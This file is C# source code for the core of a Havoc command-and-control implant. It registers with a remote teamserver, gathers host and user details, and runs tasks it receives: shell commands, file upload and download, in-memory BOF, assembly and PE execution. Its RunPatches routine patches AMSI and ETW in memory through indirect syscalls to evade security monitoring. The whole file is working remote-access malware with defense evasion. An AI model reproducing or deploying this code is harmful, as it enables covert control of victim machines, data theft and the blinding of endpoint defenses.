using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Collections;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Management;
using HavocImplant.AgentFunctions.BofExec;
using HavocImplant.AgentFunctions.BofExec.Internals;
using HavocImplant.NativeUtils;
using static HavocImplant.Implant;
using HavocImplant.Communications;

namespace HavocImplant
{
    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
    public class Implant
    {
        // Altered by build
        public string[] url = Config.url;
        public int timeout = Config.timeout;
        public int sleepTime = Config.sleepTime;
        public int maxTries = Config.maxTries;
        public bool secure = Config.secure;

        // Communication with Teamserver
        public byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
        public byte[] agentId = Encoding.ASCII.GetBytes(new Random().Next(1000, 10000).ToString());
        public bool registered;

        public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
        public struct task
        {
            public string taskCommand;
            public string taskOutput;
            public task(string taskCommand, string taskOutput)
            {
                this.taskCommand = taskCommand;
                this.taskOutput = taskOutput;
            }
        }

        // Registration Properties
        public string hostname = Dns.GetHostName();
        public string userName = Environment.UserName;
        public string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        public string IP = getIPv4();
        public string PID = Process.GetCurrentProcess().Id.ToString();
        public string PPID = "ppid here";
        public string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
        public string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        public string processName = Process.GetCurrentProcess().ProcessName;
        public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");

        // Locking resource related stuff
        static readonly object pe_lock = new object();
        static void Main(string[] args) // Looping through tasks and stuff
        {
            Implant implant = new Implant();
            Random rand = new Random();

            Comms.Init(implant);
            Communications.Utils.Init(implant);
            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            while (!implant.registered) Comms.Register();

            RunPatches();

            while (true)
            {
                byte[] rawTasks = Comms.CheckIn(implant, "", "gettask");

                // Chunk of 4 = size = there is a task that is being sent to implant
                if (rawTasks.Length > 4)
                {
                    int offset = 0;
                    string task = "";

                    // Parsing the raw request from teamserver, splitting task into dictionary entries
                    while (offset < rawTasks.Length)
                    {

                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0); // [4 bytes containing size of task][task]
                        Console.WriteLine($"Task is of size {size}");

                        string dirtyTask = Encoding.UTF8.GetString(rawTasks, offset + 4, size); // Clear up the funky
                        List<byte> dirtyArray = Encoding.UTF8.GetBytes(dirtyTask).ToList<byte>();
                        dirtyArray.RemoveAll(item => item == 0x00);

                        task = Encoding.UTF8.GetString(dirtyArray.ToArray());
                        Console.WriteLine($"Task is {task}");

                        offset += size + 4;

                        int taskId = rand.Next(10000 * 10000);
                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
                        Console.WriteLine("Task has id {0}", taskId);

                    }

                    Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);

                    // Parsing the commands from the dictionary
                    for (int i = 0; i < implant.taskingInformation.Count; i++)
                    {
                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;

                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                        Console.WriteLine("The ID is: {0}", taskId);

                        switch (command.Split(' ')[0])
                        {
                            case "shell":
                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
                                shellThread.Start();
                                break;
                            case "goodbye":
                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
                            case "sleep":
                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                sleepThread.Start();
                                break;
                            case "ls":
                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
                                lsThread.Start();
                                break;
                            case "upload":
                                Thread uploadThread = new Thread(() => AgentFunctions.Upload.Run(implant, command.Substring(6).Trim(), taskId));
                                uploadThread.Start();
                                break;
                            case "download":
                                Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
                                downloadThread.Start();
                                break;
                            case "bofexec":
                                /*
                                List<string> bofArgs = command.Substring(7).Trim().Split(';').ToList<string>();
                                List<string> bof = new List<string>();
                                if (bofArgs.Count > 2)
                                {
                                    bof.Add(bofArgs[bofArgs.Count-1]);
                                    bofArgs.RemoveAt(bofArgs.Count-1);
                                }
                                
                                Console.WriteLine($"bofArgs count: {bofArgs.Count}");
                                for (int ii = 0; ii < bofArgs.Count; ii++)
                                {
                                    Console.WriteLine($"Arg {ii} is: {bofArgs[ii]}");
                                }
                                */
                                string[] bofArgs = new string[] { command.Substring(7).Trim() };
                                Thread bofExecThread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
                                bofExecThread.Start();
                                break;
                                
                            case "inline_assembly":
                                Thread inlineAssemblyThread = new Thread(() => AgentFunctions.InlineAssembly.Run(implant, command.Substring(15).Trim(), taskId));
                                inlineAssemblyThread.Start();
                                break;
                                
                            case "inline_pe":
                                lock (pe_lock)
                                {
                                    Thread inlinePEThread = new Thread(() => AgentFunctions.InlinePE.Run(implant, command.Substring(9).Trim(), taskId));
                                    inlinePEThread.Start();
                                    break;
                                }
                        }
                    }
                }
                Thread.Sleep(implant.sleepTime);
                string cumalativeOutput = "";

                for (int i = 0; i < implant.taskingInformation.Count; i++)
                {
                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                    {
                        Console.WriteLine($"Shipping off Task ID {taskId}");
                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                        implant.taskingInformation.Remove(taskId);
                    }
                    i--;
                }
                Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
            }
        }
       
        static string getIPv4()
        {
            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return a.ToString();
            return "";

        }
        public static string HKLM_GetString(string path, string key)
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
            if (rk == null) return "";
            return (string)rk.GetValue(key);
        }
        public static void RunPatches()
        {
            // Amsi
            byte[] patch = new byte[6];
            patch[0] = 0xB8;
            patch[1] = 0x57;
            patch[2] = 0x00;
            patch[3] = 0x07;
            patch[4] = 0x80;
            patch[5] = 0xc3;
            IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
            Console.WriteLine("Amsi at 0x{0:X}", (long)pAmsi);
            dll amsi = new dll("amsi.dll");
            IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
            GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
            hPatch.Free();
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            // ETW
            IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
            Marshal.WriteByte(pNtTraceEvent, 0xc3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            
        }
    }
}